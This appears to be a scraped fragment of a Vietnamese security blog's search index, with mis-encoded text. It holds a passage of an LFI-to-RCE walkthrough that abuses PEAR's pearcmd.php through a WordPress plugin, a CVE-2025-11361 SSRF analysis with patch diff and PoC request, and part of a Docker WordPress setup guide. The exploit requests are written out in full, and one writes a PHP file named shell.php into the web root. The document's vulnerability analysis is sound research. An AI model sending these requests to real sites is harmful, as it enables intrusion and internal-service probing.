t·ª´ container v·ªÅ m√°y th·∫≠t, gi·ªØ nguy√™n c·∫•u tr√∫c th∆∞ m·ª•c, ƒë·ªÉ khi debugger d·ª´ng t·∫°i /usr/local/lib/php/pearcmd.php b·∫°n v·∫´n c√≥ th·ªÉ m·ªü v√† theo d√µi file t∆∞∆°ng ·ª©ng v·ªõi container: sudo docker cp wordpress:/usr/local/lib/php/ /usr/local/lib/php/ require_once 'PEAR.php'; require_once 'PEAR/Frontend.php'; require_once 'PEAR/Config.php'; require_once 'PEAR/Command.php'; require_once 'Console/Getopt.php'; $all_commands = PEAR_Command::getCommands(); ... $argv = Console_Getopt::readPHPArgv(); ... $options = Console_Getopt::getopt2($argv, \"c:C:d:D:Gh?sSqu:vV\"); array_shift($argv); ... $command = (isset($options[1][0])) ? $options[1][0] : null; ... if ($fetype == 'Gtk2') { ... } else { do { ... $cmd = PEAR_Command::factory($command, $config); ... list($tmpopt, $params) = $tmp; ... $ok = $cmd-\u003erun($command, $opts, $params); if ($ok === false) { PEAR::raiseError(\"unknown command `$command'\"); } ... } while (false); } ƒê·∫ßu ti√™n, t·∫•t c·∫£ c√°c command s·∫Ω ƒë∆∞·ª£c load v√†o $all_commands $all_commands = PEAR_Command::getCommands(); public static function getCommands() { if (empty($GLOBALS['_PEAR_Command_commandlist'])) { PEAR_Command::registerCommands(); } return $GLOBALS['_PEAR_Command_commandlist']; } getCommands() g·ªçi ƒë·∫øn registerCommands() ƒë·ªÉ ƒëƒÉng k√Ω c√°c command. T·∫•t c·∫£ c√°c command ƒë∆∞·ª£c load v√†o `$all_commands`\rSau ƒë√≥ $argv ƒë∆∞·ª£c kh·ªüi t·∫°o $argv = Console_Getopt::readPHPArgv(); public static function readPHPArgv() { global $argv; if (!is_array($argv)) { if (!@is_array($_SERVER['argv'])) { if (!@is_array($GLOBALS['HTTP_SERVER_VARS']['argv'])) { $msg = \"Could not read cmd args (register_argc_argv=Off?)\"; return PEAR::raiseError(\"Console_Getopt: \" . $msg); } return $GLOBALS['HTTP_SERVER_VARS']['argv']; } return $_SERVER['argv']; } return $argv; } N·∫øu $argv kh√¥ng ph·∫£i m·∫£ng (t·ª©c l√† kh√¥ng c√≥ d·ªØ li·ªáu h·ª£p l·ªá), h√†m s·∫Ω c·ªë g·∫Øng t√¨m gi√° tr·ªã t∆∞∆°ng ƒë∆∞∆°ng ·ªü $_SERVER['argv'] v√† tr·∫£ v·ªÅ, t·ª©c c√°c search-word ƒë∆∞·ªùng ta truy·ªÅn trong URL. v√≠ d·ª•: GET /wp-admin/admin-ajax.php?action=geo_mashup_query\u0026object_ids=2\u0026template=../../../../../../../usr/local/lib/php/pearcmd\u0026+config-create+/test_root_path+test_filename.php HTTP/1.1 Quan s√°t trong debugger: Gi√° tr·ªã c·ªßa `$argv` trong debugger\rNgay sau ƒë√≥ $argv s·∫Ω ƒë∆∞·ª£c lo·∫°i b·ªè ph·∫ßn t·ª≠ th·ª© nh·∫•t r·ªìi tr·ªü th√†nh ƒë·ªëi s·ªë c·ªßa Console_Getopt::getopt2(), g√≠a tr·ªã tr·∫£ v·ªÅ g√°n cho $options array_shift($argv); $options = Console_Getopt::getopt2($argv, \"c:C:d:D:Gh?sSqu:vV\"); Gi√° tr·ªã b√¢y gi·ªù l√†: Gi√° tr·ªã c·ªßa `$argv` v√† `$options` trong debugger\rBi·∫øn $command ƒë∆∞·ª£c kh·ªüi t·∫°o v·ªõi gi√° tr·ªã $options[1][0] t·ª©c config-create trong tr∆∞·ªùng h·ª£p n√†y. $command = (isset($options[1][0])) ? $options[1][0] : null; Sau ƒë√≥ 1 factory ƒë∆∞·ª£c t·∫°o v√† g√°n v√†o $cmd $cmd = PEAR_Command::factory($command, $config); Khi hover v√†o $cmd ta th·∫•y ƒë∆∞·ª£c c√°c tham s·ªë y√™u c·∫ßu c·ªßa l·ªánh config-create C√°c tham s·ªë y√™u c·∫ßu c·ªßa l·ªánh `config-create`\rV√† ƒë·∫∑c bi·ªát, ta th·∫•y h√†m th·ª±c thi cho config-create l√† doConfigCreate function doConfigCreate($command, $options, $params) { if (count($params) != 2) { return PEAR::raiseError('config-create: must have 2 parameters, root path and ' . 'filename to save as'); } $root = $params[0]; // Clean up the DIRECTORY_SEPARATOR mess $ds2 = DIRECTORY_SEPARATOR . DIRECTORY_SEPARATOR; $root = preg_replace(array('!\\\\\\\\+!', '!/+!', \"!$ds2+!\"), array('/', '/', '/'), $root); if ($root[0] != '/') { if (!isset($options['windows'])) { return PEAR::raiseError('Root directory must be an absolute path beginning ' . 'with \"/\", was: \"' . $root . '\"'); } if (!preg_match('/^[A-Za-z]:/', $root)) { return PEAR::raiseError('Root directory must be an absolute path beginning ' . 'with \"\\\\\" or \"C:\\\\\", was: \"' . $root . '\"'); } } $windows = isset($options['windows']); if ($windows) { $root = str_replace('/', '\\\\', $root); } if (!file_","date":"2025-10-22","objectID":"/vi/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/:6:0","tags":["analyst","lfi","plugin","pearcmd"],"title":"Exploiting LFI2RCE Vulnerability via PHP PEARCMD","uri":"/vi/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/#pearcmd-code-analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow\rG·ª≠i GET request: GET /wp-admin/admin-ajax.php?action=geo_mashup_query\u0026object_ids=2\u0026template=../../../../../../../usr/local/lib/php/pearcmd\u0026+config-create+/test_root_path+test_filename.php Web include /usr/local/lib/php/pearcmd.php. PHP (register_argc_argv=On) build $_SERVER['argv'] t·ª´ query ‚Üí ['action=geo_mashup_query\u0026object_ids=2\u0026template=../../../../../../../usr/local/lib/php/pearcmd\u0026','config-create','/test_root_path','test_filename.php']. Console_Getopt::readPHPArgv() tr·∫£ $argv; Console_Getopt::getopt2() parse ra $command='config-create' v√† list($tmpopt, $params) tr·∫£ v·ªÅ $params=['/test_root_path','test_filename.php']. doConfigCreate() ch·∫°y v·ªõi $params do attacker ki·ªÉm so√°t ‚Üí touch()/realpath() v√† writeConfigFile() t·∫°o/ghi file. Th√¥ng tin\rFile c·∫•u h√¨nh ƒë∆∞·ª£c t·∫°o c√≥ ch·ª©a gi√° tr·ªã root path. N·∫øu gi√° tr·ªã n√†y b·ªã ghi d∆∞·ªõi d·∫°ng m·ªôt th·∫ª PHP h·ª£p l·ªá (\u003c?php ... ?\u003e) v√† file c√≥ th·ªÉ ƒë∆∞·ª£c truy c·∫≠p b·ªüi client, webserver s·∫Ω x·ª≠ l√Ω n·ªôi dung PHP trong file ƒë√≥ v√† ƒëo·∫°n m√£ s·∫Ω ƒë∆∞·ª£c th·ª±c thi d·∫´n t·ªõi RCE ","date":"2025-10-22","objectID":"/vi/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/:7:0","tags":["analyst","lfi","plugin","pearcmd"],"title":"Exploiting LFI2RCE Vulnerability via PHP PEARCMD","uri":"/vi/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit\rT·∫≠n d·ª•ng CVE-2025-48293 ƒë√£ ph√¢n t√≠ch ƒë·ªÉ khai th√°c m·ªü r·ªông b·∫±ng pearcmd.php G·ª≠i request ch·ª©a LFI payload tr·ªè ƒë·∫øn pearcmd.php GET /wp-admin/admin-ajax.php?action=geo_mashup_query\u0026object_ids=2\u0026template=../../../../../../../usr/local/lib/php/pearcmd\u0026+config-create+/\u003c?=phpinfo();?\u003e+/var/www/html/shell.php HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Referer: http://localhost/wp-admin/ Connection: keep-alive Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: same-origin Sec-Fetch-User: ?1 X-PwnFox-Color: blue Priority: u=0, i Response tr·∫£ v·ªÅ th√†nh c√¥ng: Response tr·∫£ v·ªÅ th√†nh c√¥ng\rTruy c·∫≠p shell.php shell.php\r","date":"2025-10-22","objectID":"/vi/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/:8:0","tags":["analyst","lfi","plugin","pearcmd"],"title":"Exploiting LFI2RCE Vulnerability via PHP PEARCMD","uri":"/vi/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Essential Blocks for Gutenberg Plugin.","date":"2025-10-22","objectID":"/vi/posts/2025-10-22-cve-2025-11361/","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-11361 Analysis \u0026 POC","uri":"/vi/posts/2025-10-22-cve-2025-11361/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info\rPlugin Gutenberg Essential Blocks ‚Äì Page Builder for Gutenberg Blocks \u0026 Patterns cho WordPress b·ªã l·ªó h·ªïng Server-Side Request Forgery (SSRF) trong t·∫•t c·∫£ c√°c phi√™n b·∫£n l√™n t·ªõi v√† bao g·ªìm 5.7.1, th√¥ng qua h√†m eb_save_ai_generated_image. ƒêi·ªÅu n√†y cho ph√©p k·∫ª t·∫•n c√¥ng ƒë√£ x√°c th·ª±c, c√≥ quy·ªÅn Author-level tr·ªü l√™n, th·ª±c hi·ªán c√°c y√™u c·∫ßu web t·ªõi b·∫•t k·ª≥ ƒë·ªãa ch·ªâ n√†o xu·∫•t ph√°t t·ª´ ·ª©ng d·ª•ng web v√† c√≥ th·ªÉ b·ªã l·ª£i d·ª•ng ƒë·ªÉ truy v·∫•n v√† ch·ªânh s·ª≠a th√¥ng tin t·ª´ c√°c d·ªãch v·ª• n·ªôi b·ªô. CVE ID: CVE-2025-11361 Vulnerability Type: Server Side Request Forgery (SSRF) Affected Versions: \u003c= 5.7.1 Patched Versions: 5.7.2 CVSS severity: Low (5.5) Required Privilege: Author Product: WordPress Essential Blocks for Gutenberg Plugin ","date":"2025-10-22","objectID":"/vi/posts/2025-10-22-cve-2025-11361/:1:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-11361 Analysis \u0026 POC","uri":"/vi/posts/2025-10-22-cve-2025-11361/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - Essential Blocks for Gutenberg: 5.7.1 (vulnerable) v√† 5.7.2 (patched). Diff tool - Meld ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• so s√°nh (diff) n√†o ƒë·ªÉ ki·ªÉm tra v√† so s√°nh kh√°c bi·ªát gi·ªØa hai phi√™n b·∫£n. ","date":"2025-10-22","objectID":"/vi/posts/2025-10-22-cve-2025-11361/:2:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-11361 Analysis \u0026 POC","uri":"/vi/posts/2025-10-22-cve-2025-11361/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis\r","date":"2025-10-22","objectID":"/vi/posts/2025-10-22-cve-2025-11361/:3:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-11361 Analysis \u0026 POC","uri":"/vi/posts/2025-10-22-cve-2025-11361/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch diff\rB·∫£n l·ªói: public function eb_save_ai_generated_image() { if ( ! isset( $_POST[ 'admin_nonce' ] ) || ! wp_verify_nonce( sanitize_key( $_POST[ 'admin_nonce' ] ), 'admin-nonce' ) ) { wp_send_json_error( __( 'Nonce Error', 'essential-blocks' ) ); } if ( ! current_user_can( 'upload_files' ) ) { wp_send_json_error( __( 'You are not authorized to upload files!', 'essential-blocks' ) ); } // Check if we have either image_url or image_b64 along with prompt if ( ( isset( $_POST[ 'image_url' ] ) || isset( $_POST[ 'image_b64' ] ) ) \u0026\u0026 isset( $_POST[ 'prompt' ] ) ) { $image_url = isset( $_POST[ 'image_url' ] ) ? esc_url_raw( $_POST[ 'image_url' ] ) : null; $image_body = ''; // Handle URL format if ( $image_url ) { // Download the image from OpenAI URL $image_data = wp_remote_get( $image_url, [ 'timeout' =\u003e 60 ] ); if ( is_wp_error( $image_data ) ) { wp_send_json_error( [ 'message' =\u003e __( 'Failed to download image from OpenAI.', 'essential-blocks' ) ] ); return; } // Detect image format and set appropriate extension and MIME type $image_info = getimagesizefromstring( $image_body ); $mime_type = $image_info ? $image_info[ 'mime' ] : 'image/png'; // Determine file extension based on MIME type $extension = 'png'; // default switch ( $mime_type ) { case 'image/jpeg': $extension = 'jpg'; break; case 'image/png': $extension = 'png'; break; case 'image/webp': $extension = 'webp'; break; case 'image/gif': $extension = 'gif'; break; } $image_body = wp_remote_retrieve_body( $image_data ); } // other logic } else { wp_send_json_error( __( 'Image data (URL or base64) and prompt are required', 'essential-blocks' ) ); } } Trong phi√™n b·∫£n l·ªói, s·ª≠ d·ª•ng wp_remote_get($image_url) ƒë·ªÉ t·∫£i h√¨nh ·∫£nh m√† kh√¥ng x√°c th·ª±c ho·∫∑c gi·ªõi h·∫°n ngu·ªìn URL. Kh√¥ng ki·ªÉm tra m√£ ph·∫£n h·ªìi HTTP, MIME type hay n·ªôi dung th·ª±c t·∫ø c·ªßa t·ªáp tr·∫£ v·ªÅ, khi·∫øn k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ l·ª£i d·ª•ng g·ª≠i y√™u c·∫ßu SSRF ƒë·∫øn c√°c d·ªãch v·ª• n·ªôi b·ªô ho·∫∑c t·∫£i v·ªÅ d·ªØ li·ªáu ƒë·ªôc h·∫°i gi·∫£ d·∫°ng h√¨nh ·∫£nh. B·∫£n v√°: public function eb_save_ai_generated_image() { if ( ! isset( $_POST[ 'admin_nonce' ] ) || ! wp_verify_nonce( sanitize_key( $_POST[ 'admin_nonce' ] ), 'admin-nonce' ) ) { wp_send_json_error( __( 'Nonce Error', 'essential-blocks' ) ); } if ( ! current_user_can( 'upload_files' ) ) { wp_send_json_error( __( 'You are not authorized to upload files!', 'essential-blocks' ) ); } // Check if we have either image_url or image_b64 along with prompt if ( ( isset( $_POST[ 'image_url' ] ) || isset( $_POST[ 'image_b64' ] ) ) \u0026\u0026 isset( $_POST[ 'prompt' ] ) ) { $image_url = isset( $_POST[ 'image_url' ] ) ? esc_url_raw( $_POST[ 'image_url' ] ) : null; $image_body = ''; // Handle URL format if ( $image_url ) { // Download the image from validated URL $image_data = wp_safe_remote_get( $image_url, [ 'timeout' =\u003e 30, 'redirection' =\u003e 3, 'user-agent' =\u003e 'Essential Blocks/' . ESSENTIAL_BLOCKS_VERSION, 'headers' =\u003e [ 'Accept' =\u003e 'image/*' ] ] ); if ( is_wp_error( $image_data ) ) { wp_send_json_error( [ 'message' =\u003e __( 'Failed to download image from URL.', 'essential-blocks' ) ] ); return; } // Validate response $response_code = wp_remote_retrieve_response_code( $image_data ); if ( $response_code !== 200 ) { wp_send_json_error( [ 'message' =\u003e __( 'Invalid response from image URL.', 'essential-blocks' ) ] ); return; } // Security: Validate image content and size if ( ! $this-\u003eis_valid_image_content( $image_body ) ) { wp_send_json_error( [ 'message' =\u003e __( 'Invalid image content provided.', 'essential-blocks' ) ] ); return; } // Detect image format and set appropriate extension and MIME type $image_info = getimagesizefromstring( $image_body ); if ( ! $image_info ) { wp_send_json_error( [ 'message' =\u003e __( 'Unable to determine image format.', 'essential-blocks' ) ] ); return; } $mime_type = $image_info[ 'mime' ]; // Security: Only allow specific image MIME types $allowed_mime_types = [ 'image/jpeg', 'image/png', 'image/webp', 'image/gif' ]; if ( ! in_array( $mime_type, $allowed_mime_types, true ) ) { wp_send_json_error( [ 'message' =\u003e __(","date":"2025-10-22","objectID":"/vi/posts/2025-10-22-cve-2025-11361/:3:1","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-11361 Analysis \u0026 POC","uri":"/vi/posts/2025-10-22-cve-2025-11361/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"Vulnerable Code\reb_save_ai_generated_image() ƒë∆∞·ª£c ƒëƒÉng k√Ω l√†m callback cho action hook, v·ªõi hook name wp_ajax_save_ai_generated_image add_action( 'wp_ajax_save_ai_generated_image', [ $this, 'eb_save_ai_generated_image' ] ); T·ª©c khi truy c·∫≠p endpoint /wp-admin/admin-ajax.php v·ªõi param action=save_ai_generated_image th√¨ eb_save_ai_generated_image() ƒë∆∞·ª£c g·ªçi. ƒê·ªÉ wp_remote_get() ƒë∆∞·ª£c th·ª±c thi, ta c·∫ßn v∆∞·ª£t qua c√°c ƒëi·ªÅu ki·ªán sau: check admin_nonce if ( ! isset( $_POST[ 'admin_nonce' ] ) || ! wp_verify_nonce( sanitize_key( $_POST[ 'admin_nonce' ] ), 'admin-nonce' ) ) { wp_send_json_error( __( 'Nonce Error', 'essential-blocks' ) ); } M·∫∑c ƒë·ªãnh khi truy c·∫≠p wp-admin, admin_nonce s·∫Ω ƒë∆∞·ª£c set, c√≥ th·ªÉ t√¨m th·∫•y b·∫±ng c√°ch inspect code v√† t√¨m v·ªõi t·ª´ kh√≥a admin_nonce T√¨m admin_nonce b·∫±ng c√°ch inspect code Check user-level if ( ! current_user_can( 'upload_files' ) ) { wp_send_json_error( __( 'You are not authorized to upload files!', 'essential-blocks' ) ); } upload_files y√™u c·∫ßu user Author-level tr·ªü l√™n POST request ch·ª©a image_url v√† prompt param. if ( ( isset( $_POST[ 'image_url' ] ) || isset( $_POST[ 'image_b64' ] ) ) \u0026\u0026 isset( $_POST[ 'prompt' ] ) ) ","date":"2025-10-22","objectID":"/vi/posts/2025-10-22-cve-2025-11361/:3:2","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-11361 Analysis \u0026 POC","uri":"/vi/posts/2025-10-22-cve-2025-11361/#vulnerable-code"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit\r","date":"2025-10-22","objectID":"/vi/posts/2025-10-22-cve-2025-11361/:4:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-11361 Analysis \u0026 POC","uri":"/vi/posts/2025-10-22-cve-2025-11361/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Local Server\rT·∫°o local service ƒë∆°n gi·∫£n b·∫±ng python from flask import Flask, jsonify, request, send_from_directory import os BASE_DIR = os.path.abspath(os.getcwd()) app = Flask(__name__) @app.route('/test') def test(): return send_from_directory(BASE_DIR, 'requirements.txt', as_attachment=True) if __name__ == '__main__': app.run(host='0.0.0.0', port=8001, debug=True) hello ","date":"2025-10-22","objectID":"/vi/posts/2025-10-22-cve-2025-11361/:4:1","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-11361 Analysis \u0026 POC","uri":"/vi/posts/2025-10-22-cve-2025-11361/#local-server"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC)\rG·ª≠i request v·ªõi image_url tr·ªè ƒë·∫øn local service http://127.0.0.1:8001/test b·∫±ng user Author POST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Referer: http://localhost/wp-login.php?loggedout=true\u0026wp_lang=en_US Connection: keep-alive Cookie: wordpress_86a9106ae65537651a8e456835b316ab=auth%7C1761189920%7CaUULiwmj9KXCapzU3Q82L7W45WcbXbqHowa8a6yQ2Vz%7C3cc12be38f8f94048309b7fcd31bd2187065311afecea7df5a9f01f5a207072b; wordpress_test_cookie=WP%20Cookie%20check; wp_lang=en_US; wordpress_logged_in_86a9106ae65537651a8e456835b316ab=auth%7C1761189920%7CaUULiwmj9KXCapzU3Q82L7W45WcbXbqHowa8a6yQ2Vz%7C38f09626eae6d08f6cdb9cd1ce781da26c2acdd8ef2fd1822d84a6d76c6c95ad; wp-settings-time-4=1761017121 action=save_ai_generated_image\u0026admin_nonce=9433571df4\u0026prompt=abc\u0026image_url=http://127.0.0.1:8001/test Response: Result: ƒê·ªçc file ƒë∆∞·ª£c l∆∞u http://localhost/wp-content/uploads/2025/10/ai-generated-abc-1761019403.png b·∫±ng BurpSuite N·ªôi dung ƒë·ªçc ƒë∆∞·ª£c t·ª´ local service\rInformation\rKh√¥ng th·ªÉ ƒë·ªçc n·ªôi dung tr√™n ·ªü tr√¨nh duy·ªát, v√¨ n·ªôi dung trong ai-generated-abc-1761019403.png ('hello') kh√¥ng ph√π h·ª£p v·ªõi Content-Type: image/png tr·∫£ v·ªÅ, n√™n tr√¨nh duy·ªát render ra l·ªói. ","date":"2025-10-22","objectID":"/vi/posts/2025-10-22-cve-2025-11361/:4:2","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-11361 Analysis \u0026 POC","uri":"/vi/posts/2025-10-22-cve-2025-11361/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rPhi√™n b·∫£n ‚â§ 5.7.1 c·ªßa Essential Blocks for Gutenberg m·∫Øc l·ªói SSRF do d√πng wp_remote_get() t·∫£i URL kh√¥ng ki·ªÉm so√°t, cho ph√©p user Author g·ª≠i request ƒë·∫øn ƒë·ªãa ch·ªâ n·ªôi b·ªô. B·∫£n v√° 5.7.2 thay b·∫±ng wp_safe_remote_get(), th√™m ki·ªÉm tra m√£ ph·∫£n h·ªìi, MIME h·ª£p l·ªá v√† x√°c th·ª±c n·ªôi dung h√¨nh ·∫£nh, gi√∫p ngƒÉn ch·∫∑n SSRF. ","date":"2025-10-22","objectID":"/vi/posts/2025-10-22-cve-2025-11361/:4:3","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-11361 Analysis \u0026 POC","uri":"/vi/posts/2025-10-22-cve-2025-11361/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key takeaways\rC·∫≠p nh·∫≠t ngay l√™n v5.7.2. D√πng wp_safe_remote_get() thay cho wp_remote_get(). Lu√¥n x√°c th·ª±c ph·∫£n h·ªìi (HTTP code, MIME, n·ªôi dung). Gi·ªõi h·∫°n timeout, redirect v√† k√≠ch th∆∞·ªõc file. Ki·ªÉm tra d·ªØ li·ªáu ƒë·∫ßu v√†o v√† quy·ªÅn user c·∫©n th·∫≠n. ","date":"2025-10-22","objectID":"/vi/posts/2025-10-22-cve-2025-11361/:4:4","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-11361 Analysis \u0026 POC","uri":"/vi/posts/2025-10-22-cve-2025-11361/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rSSRF (Server Side Request Forgery) ‚Äî Hacktrick WordPress Essential Blocks for Gutenberg Plugin \u003c= 5.7.1 is vulnerable to Server Side Request Forgery (SSRF) ","date":"2025-10-22","objectID":"/vi/posts/2025-10-22-cve-2025-11361/:5:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-11361 Analysis \u0026 POC","uri":"/vi/posts/2025-10-22-cve-2025-11361/#references"},{"categories":["Web"],"collections":null,"content":"A powerful and the most popular content management system (CMS).","date":"2025-10-22","objectID":"/vi/posts/2025-10-22-wordpress-local-and-debugging-docker/","tags":["cms","php","wordpress","docker"],"title":"WordPress Local and Debugging in Docker","uri":"/vi/posts/2025-10-22-wordpress-local-and-debugging-docker/"},{"categories":["Web"],"collections":null,"content":"Ti·∫øp n·ªëi ph·∫ßn h∆∞·ªõng d·∫´n c√†i ƒë·∫∑t WordPress tr√™n m√¥i tr∆∞·ªùng local ·ªü b√†i vi·∫øt tr∆∞·ªõc, b√†i n√†y s·∫Ω h∆∞·ªõng d·∫´n b·∫°n thi·∫øt l·∫≠p WordPress b·∫±ng Docker ‚Äî m·ªôt c√°ch hi·ªán ƒë·∫°i, linh ho·∫°t v√† d·ªÖ chia s·∫ª h∆°n. ","date":"2025-10-22","objectID":"/vi/posts/2025-10-22-wordpress-local-and-debugging-docker/:0:0","tags":["cms","php","wordpress","docker"],"title":"WordPress Local and Debugging in Docker","uri":"/vi/posts/2025-10-22-wordpress-local-and-debugging-docker/#"},{"categories":["Web"],"collections":null,"content":"Why Use Docker?\rDocker cho ph√©p b·∫°n ƒë√≥ng g√≥i to√†n b·ªô m√¥i tr∆∞·ªùng ch·∫°y WordPress (PHP, MySQL, web server v√† m√£ ngu·ªìn) v√†o c√°c container ƒë·ªôc l·∫≠p. C√°ch l√†m n√†y mang l·∫°i nhi·ªÅu l·ª£i √≠ch: ƒê·ªìng nh·∫•t m√¥i tr∆∞·ªùng: Ch·∫°y gi·ªëng nhau tr√™n m·ªçi m√°y, tr√°nh l·ªói ‚Äúch·∫°y ƒë∆∞·ª£c tr√™n m√°y t√¥i‚Äù. D·ªÖ c√†i ƒë·∫∑t v√† t√°i t·∫°o: Ch·ªâ c·∫ßn v√†i l·ªánh ƒë·ªÉ kh·ªüi t·∫°o ho·∫∑c reset to√†n b·ªô h·ªá th·ªëng. C√°ch ly v√† an to√†n: M·ªói container l√† m·ªôt m√¥i tr∆∞·ªùng ri√™ng, tr√°nh xung ƒë·ªôt ph·∫ßn m·ªÅm. Thu·∫≠n ti·ªán cho ph√°t tri·ªÉn v√† debug: C√≥ th·ªÉ b·∫≠t Xdebug, theo d√µi log, ho·∫∑c ch·ªânh PHP m√† kh√¥ng ·∫£nh h∆∞·ªüng ƒë·∫øn h·ªá th·ªëng ch√≠nh. D·ªÖ chia s·∫ª: Ch·ªâ c·∫ßn g·ª≠i file docker-compose.yml v√† c√°c file c·∫•u h√¨nh, ng∆∞·ªùi kh√°c c√≥ th·ªÉ kh·ªüi ch·∫°y c√πng m√¥i tr∆∞·ªùng gi·ªëng b·∫°n ‚Äî kh√¥ng c·∫ßn c√†i ƒë·∫∑t th·ªß c√¥ng. Docker l√† gi·∫£i ph√°p t·ªëi ∆∞u ƒë·ªÉ ph√°t tri·ªÉn, th·ª≠ nghi·ªám v√† c·ªông t√°c tr√™n c√°c d·ª± √°n WordPress, ƒë·∫∑c bi·ªát h·ªØu √≠ch cho l·∫≠p tr√¨nh vi√™n, nh√≥m l√†m vi·ªác ho·∫∑c ng∆∞·ªùi l√†m pentest mu·ªën c√≥ m√¥i tr∆∞·ªùng nh·∫•t qu√°n, d·ªÖ t√°i s·ª≠ d·ª•ng. ","date":"2025-10-22","objectID":"/vi/posts/2025-10-22-wordpress-local-and-debugging-docker/:1:0","tags":["cms","php","wordpress","docker"],"title":"WordPress Local and Debugging in Docker","uri":"/vi/posts/2025-10-22-wordpress-local-and-debugging-docker/#why-use-docker"},{"categories":["Web"],"collections":null,"content":"Setup WordPress for Hacker in Docker\r","date":"2025-10-22","objectID":"/vi/posts/2025-10-22-wordpress-local-and-debugging-docker/:2:0","tags":["cms","php","wordpress","docker"],"title":"WordPress Local and Debugging in Docker","uri":"/vi/posts/2025-10-22-wordpress-local-and-debugging-docker/#setup-wordpress-for-hacker-in-docker"},{"categories":["Web"],"collections":null,"content":"Prerequisites\rDocker\rTr∆∞·ªõc ti√™n, b·∫°n c·∫ßn c√†i ƒë·∫∑t Docker. C√¥ng c·ª• n√†y h·ªó tr·ª£ tr√™n nhi·ªÅu h·ªá ƒëi·ªÅu h√†nh, m·ªói n·ªÅn t·∫£ng c√≥ c√°ch c√†i ƒë·∫∑t ri√™ng. Xem h∆∞·ªõng d·∫´n t·∫°i: https://www.docker.com/get-started/ Docker Compose\rThay v√¨ ch·∫°y t·ª´ng container th·ªß c√¥ng b·∫±ng docker run, ta d√πng Docker Compose ƒë·ªÉ ƒë·ªãnh nghƒ©a v√† qu·∫£n l√Ω nhi·ªÅu container li√™n k·∫øt ch·ªâ b·∫±ng m·ªôt file c·∫•u h√¨nh duy nh·∫•t (docker-compose.yml). V·ªõi WordPress, ta c·∫ßn: M·ªôt container MySQL ƒë·ªÉ l∆∞u c∆° s·ªü d·ªØ li·ªáu. M·ªôt container WordPress (PHP + web server) ƒë·ªÉ ch·∫°y m√£ ngu·ªìn. N·∫øu l√†m th·ªß c√¥ng, b·∫°n s·∫Ω ph·∫£i nh·∫≠p nhi·ªÅu l·ªánh v√† c·∫•u h√¨nh ph·ª©c t·∫°p. V·ªõi Docker Compose, t·∫•t c·∫£ n·∫±m trong m·ªôt file YAML gi√∫p: D·ªÖ c√†i ƒë·∫∑t: docker-compose up -d l√† c√≥ ƒë·ªß WordPress + MySQL. D·ªÖ chia s·∫ª: Ng∆∞·ªùi kh√°c ch·ªâ c·∫ßn c√πng file docker-compose.yml l√† ch·∫°y ƒë∆∞·ª£c. D·ªÖ m·ªü r·ªông: Th√™m phpMyAdmin, Nginx, ho·∫∑c Xdebug ch·ªâ c·∫ßn v√†i d√≤ng. Xem h∆∞·ªõng d·∫´n c√†i Docker Compose t·∫°i: https://docs.docker.com/compose/install/ ","date":"2025-10-22","objectID":"/vi/posts/2025-10-22-wordpress-local-and-debugging-docker/:2:1","tags":["cms","php","wordpress","docker"],"title":"WordPress Local and Debugging in Docker","uri":"/vi/posts/2025-10-22-wordpress-local-and-debugging-docker/#prerequisites"},{"categories":["Web"],"collections":null,"content":"Prerequisites\rDocker\rTr∆∞·ªõc ti√™n, b·∫°n c·∫ßn c√†i ƒë·∫∑t Docker. C√¥ng c·ª• n√†y h·ªó tr·ª£ tr√™n nhi·ªÅu h·ªá ƒëi·ªÅu h√†nh, m·ªói n·ªÅn t·∫£ng c√≥ c√°ch c√†i ƒë·∫∑t ri√™ng. Xem h∆∞·ªõng d·∫´n t·∫°i: https://www.docker.com/get-started/ Docker Compose\rThay v√¨ ch·∫°y t·ª´ng container th·ªß c√¥ng b·∫±ng docker run, ta d√πng Docker Compose 